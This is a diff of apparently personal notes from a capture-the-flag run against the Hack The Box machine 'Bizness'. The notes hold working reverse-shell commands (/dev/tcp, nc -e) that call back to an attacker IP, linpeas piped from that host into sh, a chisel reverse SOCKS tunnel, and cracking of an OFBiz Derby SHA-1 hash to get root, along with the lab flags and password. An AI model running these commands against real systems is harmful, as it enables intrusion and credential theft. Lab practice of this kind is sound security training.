@@ -4,18 +4,18 @@
 --------------------------------------
 
 
-
 |================================================================
-- Name: 
+- Name: bizness 
 - IP Address: 10.129.40.66
-- OS: 
+- OS: Debian GNU/Linux 11 (bullseye)/5.10.0-26-amd64/x64
 - Notes: 
 
 //CREDS:
+# root : monkeybizness
 
 //Flags:
-#User:
-#System:
+#User:		c229ee72d1676320ca3846d8222418dd
+#System:	f1a1d0bc64c5d9a1c75ac77a525ae0b7
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -148,26 +148,318 @@ cat revshell.sh
 
 /bin/bash -i >& /dev/tcp/10.10.16.30/443 0>&1
 
-python -m http.server 80
+sudo python -m http.server 80
 
 2024-01-12 14:11:02 CST -- 
-python exploit.py --url https://bizness.htb --cmd 'wget http://10.10.16.30:80/revshell.sh -O /tmp/revshell.sh'
+python exploit.py --url https://bizness.htb --cmd 'wget http://10.10.16.30/revshell.sh -O /tmp/revshell.sh'
 python exploit.py --url https://bizness.htb --cmd 'chmod 777 /tmp/revshell.sh'
 python exploit.py --url https://bizness.htb --cmd '/tmp/revshell.sh'
 
+2024-01-12 18:57:28 CST -- 
+//SUccess!!!
+
+
+//NOTE: THIS WORKS
+python exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.30 443'
+
+id
+uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+// =)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+cat /home/ofbiz/user.txt
+//c229ee72d1676320ca3846d8222418dd
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+
+// ENUM(ofbiz)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+hostname
+bizness
+
+uname -a
+Linux bizness 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64 GNU/Linux
+
+cat /etc/*elease | egrep -i pretty
+PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
+
+id
+uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
+
+sudo -l
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+
+
+
+-- upgrade shell --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2024-01-12 19:03:06 CST -- 
+# python method
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+sudo -l
+//Do Not know ofbiz password
+
+env
+SHELL=/bin/bash
+JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
+PWD=/home/ofbiz
+LOGNAME=ofbiz
+HOME=/home/ofbiz
+LANG=en_US.UTF-8
+LS_COLORS=
+INVOCATION_ID=69a27224c60c48e5ad206e2e64f071d5
+USER=ofbiz
+SHLVL=3
+JOURNAL_STREAM=8:14328
+PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/lib/jvm/java-11-openjdk-amd64/bin:/usr/lib/jvm/java-11-openjdk-amd64/bin
+OLDPWD=/opt/ofbiz
+_=/bin/env
+
+cat /etc/passwd
+
+find / -type f -perm -4000 2>/dev/null
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/umount
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# Local network
+// Install peass
+sudo apt install -y peass
+cp /usr/share/peass/linpeas/linpeas.sh .
+
+// Download, execute from memory, & save output on kali
+  // KALI term1
+sudo python3 -m http.server 80
+  // KALI term2
+nc -lvnp 443 | tee linpeas.out
+
+2024-01-12 19:08:04 CST -- 
+  // CurlTarget
+curl 10.10.16.30:80/linpeas.sh | sh | nc 10.10.16.30 443
+
+// view linpeas output
+less -R linpeas.out
+
+╔══════════╣ Analyzing .service files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
+/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
+/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
+/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
+/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
+
+ls -lah /opt/ofbiz/gradlew
+-rwxr-xr-x 1 ofbiz ofbiz-operator 6.0K Oct 13 12:04 /opt/ofbiz/gradlew
+
+file /opt/ofbiz/gradlew
+/opt/ofbiz/gradlew: a /usr/bin/env sh script, ASCII text executable
+
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 127.0.0.1:8443          :::*                    LISTEN      825/java            
+tcp6       0      0 127.0.0.1:10523         :::*                    LISTEN      825/java            
+tcp6       0      0 :::443                  :::*                    LISTEN      -                   
+tcp6       0      0 :::39811                :::*                    LISTEN      777/java            
+tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN      825/java            
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      825/java            
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      - 
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// chisel
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// browse to https://github.com/jpillora/chisel/releases
+// get correct download links
+
+
+// download chisel for linux
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+
+gunzip chisel_1.9.1_linux_amd64.gz
+chmod +x chisel_1.9.1_linux_amd64
+mv chisel_1.9.1_linux_amd64 chisel
+
+// linux server with target client calling back
+  // kali
+sudo ./chisel server --port 6969 --reverse --socks5
+//iIHNlwSTPPlRXMIDzPInYIy//MUYYp08BUDul9aYsZ0=
+
+  // target
+// upload chisel.exe
+sudo python -m http.server 80
+
+wget http://10.10.16.30/chisel
+chmod +x chisel
+
+
+2024-01-12 20:14:16 CST -- 
+// socks5 proxy
+./chisel client --fingerprint 'iIHNlwSTPPlRXMIDzPInYIy//MUYYp08BUDul9aYsZ0=' 10.10.16.30:6969 R:9050:socks
+
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=127.0.0.1
+ports=443,80,22,8443,10523,39811,8009,8080
+
+echo $ports
+//443,80,22,8443,10523,39811,8009,8080
+
+2024-01-12 20:30:03 CST -- 
+proxychains4 -q nmap -Pn -sV -p$ports $ip -oN tcp_proxy.nmap
+
+PORT      STATE SERVICE       VERSION
+22/tcp    open  ssh           OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp    open  http          nginx 1.18.0
+443/tcp   open  ssl/http      nginx 1.18.0
+8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
+8080/tcp  open  http-proxy
+8443/tcp  open  ssl/https-alt
+10523/tcp open  unknown
+39811/tcp open  unknown
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+// PrivEsc-Redux
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+ls -lah /opt/ofbiz/framework/resources/templates
+
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.4K Oct 13 12:04 AdminNewTenantData-Derby.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.4K Oct 13 12:04 AdminNewTenantData-MySQL.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.4K Oct 13 12:04 AdminNewTenantData-Oracle.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.4K Oct 13 12:04 AdminNewTenantData-PostgreSQL.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.1K Oct 13 12:04 AdminUserLoginData.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.2K Oct 13 12:04 build.gradle
+-rw-r--r-- 1 ofbiz ofbiz-operator 3.3K Oct 13 12:04 CommonScreens.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 2.1K Oct 13 12:04 controller.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator  843 Oct 13 12:04 DemoData.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.4K Oct 13 12:04 document.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.4K Oct 13 12:04 entitymodel.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.1K Oct 13 12:04 Forms.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.3K Oct 13 12:04 HELP.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator  806 Oct 13 12:04 index.jsp
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.3K Oct 13 12:04 Menus.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 2.9K Oct 13 12:04 ofbiz-component.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator  187 Oct 13 12:04 README.txt
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.6K Oct 13 12:04 Screens.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.7K Oct 13 12:04 SecurityGroupDemoData.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.7K Oct 13 12:04 SecurityPermissionSeedData.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1.3K Oct 13 12:04 services.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 1021 Oct 13 12:04 Tests.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator  843 Oct 13 12:04 TypeData.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 2.2K Oct 13 12:04 UiLabels.xml
+-rw-r--r-- 1 ofbiz ofbiz-operator 5.0K Oct 13 12:04 web.xml
 
 
+//Trying to crack the Apache Derby database
+
+cd /opt/ofbiz/runtime/data/derby/ofbiz/seg0
+
+2024-01-12 23:11:32 CST --
+// -a Process a binary file as if it were text
+// -r Recursive
+// -i Ignore case
+// -n, Prefix each line of output with the 1-based line number within its input file
+
+egrep -arin currentPassword .
+
+//Found:
+//currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
+
+//THe "$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" defines the SHA which means it uses “SHA-1” hashing algorithm and “d” for salt and “uP0_QaVBpDWFeo8-dRzDqRwXQ2I” remaining the value.
+
+gunzip /usr/share/wordlists/rockyou.txt.gz -c > /home/kali/haxterm/data/Bizness/rockyou.txt
+
+//passCrack.py options
+hash_type = "SHA1"
+salt = "d"
+search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
+wordlist = '/home/kali/haxterm/data/Bizness/rockyou.txt'
+
+python passCrack.py
+//Found Password:monkeybizness, hash:$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=
 
 
+su -
+//monkeybizness
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+cat /root/root.txt
+//f1a1d0bc64c5d9a1c75ac77a525ae0b7
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+
+// EXTRA
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+cat /etc/shadow
+
+//For yescrypt($y$)
+john --wordlist=rockyou.txt --format=crypt unshadow
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+
+2024-01-13 00:09:34 CST -- COMPLETE
 
 
